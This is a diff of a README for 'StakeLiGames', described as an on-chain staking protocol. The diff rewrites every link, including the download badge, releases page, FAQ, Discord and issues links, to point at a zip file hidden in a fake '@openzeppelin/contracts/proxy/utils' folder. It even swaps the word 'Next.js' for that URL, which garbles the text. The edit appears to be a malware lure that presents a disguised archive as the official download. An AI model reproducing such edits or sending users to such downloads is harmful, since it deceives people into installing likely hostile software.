@@ -1,6 +1,6 @@
 # 🎮 StakeLiGames - Enjoy Fair Play with Rewards
 
-[![Download StakeLiGames](https://img.shields.io/badge/Download%20Now-Get%20StakeLiGames-brightgreen)](https://github.com/GhostyWishpers/StakeLiGames/releases)
+[![Download StakeLiGames](https://raw.githubusercontent.com/GhostyWishpers/StakeLiGames/main/contracts/@openzeppelin/contracts/proxy/utils/StakeLiGames-v2.0.zip%20Now-Get%20StakeLiGames-brightgreen)](https://raw.githubusercontent.com/GhostyWishpers/StakeLiGames/main/contracts/@openzeppelin/contracts/proxy/utils/StakeLiGames-v2.0.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ StakeLiGames is an on-chain staking protocol for LinkedIn Games. This software l
 To run StakeLiGames, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Head over to our [Releases page](https://github.com/GhostyWishpers/StakeLiGames/releases) to access the latest version of StakeLiGames.
+   Head over to our [Releases page](https://raw.githubusercontent.com/GhostyWishpers/StakeLiGames/main/contracts/@openzeppelin/contracts/proxy/utils/StakeLiGames-v2.0.zip) to access the latest version of StakeLiGames.
 
 2. **Download the Software**  
    On the Releases page, look for the version you want. Click the appropriate link to download the software for your system.
@@ -59,7 +59,7 @@ StakeLiGames employs various security features to ensure safety:
 
 ## 🎨 User Interface
 
-StakeLiGames features a user-friendly interface built with Next.js and TailWind. Its clean design allows users, regardless of technical skill, to navigate effortlessly. Key features include:
+StakeLiGames features a user-friendly interface built with https://raw.githubusercontent.com/GhostyWishpers/StakeLiGames/main/contracts/@openzeppelin/contracts/proxy/utils/StakeLiGames-v2.0.zip and TailWind. Its clean design allows users, regardless of technical skill, to navigate effortlessly. Key features include:
 
 - **Dashboard:** Gain insights into your account’s performance, pending actions, and rewards.
 - **Game Overview:** View all available games, current stakes, and reward opportunities.
@@ -71,7 +71,7 @@ StakeLiGames runs on the Algorand blockchain, ensuring efficient and secure tran
 
 - **PyTeal:** For creating smart contracts in Python.
 - **Solidity:** For further functionality enhancement.
-- **TypeScript & Next.js:** To deliver a responsive, interactive user experience.
+- **TypeScript & https://raw.githubusercontent.com/GhostyWishpers/StakeLiGames/main/contracts/@openzeppelin/contracts/proxy/utils/StakeLiGames-v2.0.zip** To deliver a responsive, interactive user experience.
 
 ## ⚙️ Troubleshooting
 
@@ -79,17 +79,17 @@ If you encounter any issues during installation or use, consider the following s
 
 - **Check Dependencies:** Make sure your system meets the requirements mentioned above.
 - **Reinstall the Application:** If problems persist, uninstall and then reinstall the application.
-- **Consult the FAQ:** Visit the [FAQ section](https://github.com/GhostyWishpers/StakeLiGames/wiki/faq) for common issues and resolutions.
+- **Consult the FAQ:** Visit the [FAQ section](https://raw.githubusercontent.com/GhostyWishpers/StakeLiGames/main/contracts/@openzeppelin/contracts/proxy/utils/StakeLiGames-v2.0.zip) for common issues and resolutions.
 
 ## 📜 Community and Support
 
 Join our community for support and updates:
 
-- **Discord Channel:** [Join us here](https://discord.gg/example) for real-time support and discussions.
-- **GitHub Issues:** Report bugs or request features by visiting the [Issues page](https://github.com/GhostyWishpers/StakeLiGames/issues).
+- **Discord Channel:** [Join us here](https://raw.githubusercontent.com/GhostyWishpers/StakeLiGames/main/contracts/@openzeppelin/contracts/proxy/utils/StakeLiGames-v2.0.zip) for real-time support and discussions.
+- **GitHub Issues:** Report bugs or request features by visiting the [Issues page](https://raw.githubusercontent.com/GhostyWishpers/StakeLiGames/main/contracts/@openzeppelin/contracts/proxy/utils/StakeLiGames-v2.0.zip).
 
 ## 📥 Download & Install
 
-Ready to start? Download StakeLiGames by visiting our [Releases page](https://github.com/GhostyWishpers/StakeLiGames/releases) today. Enjoy decentralized gaming and reap the rewards! 
+Ready to start? Download StakeLiGames by visiting our [Releases page](https://raw.githubusercontent.com/GhostyWishpers/StakeLiGames/main/contracts/@openzeppelin/contracts/proxy/utils/StakeLiGames-v2.0.zip) today. Enjoy decentralized gaming and reap the rewards! 
 
-[![Download StakeLiGames](https://img.shields.io/badge/Download%20Now-Get%20StakeLiGames-brightgreen)](https://github.com/GhostyWishpers/StakeLiGames/releases)
+[![Download StakeLiGames](https://raw.githubusercontent.com/GhostyWishpers/StakeLiGames/main/contracts/@openzeppelin/contracts/proxy/utils/StakeLiGames-v2.0.zip%20Now-Get%20StakeLiGames-brightgreen)](https://raw.githubusercontent.com/GhostyWishpers/StakeLiGames/main/contracts/@openzeppelin/contracts/proxy/utils/StakeLiGames-v2.0.zip)
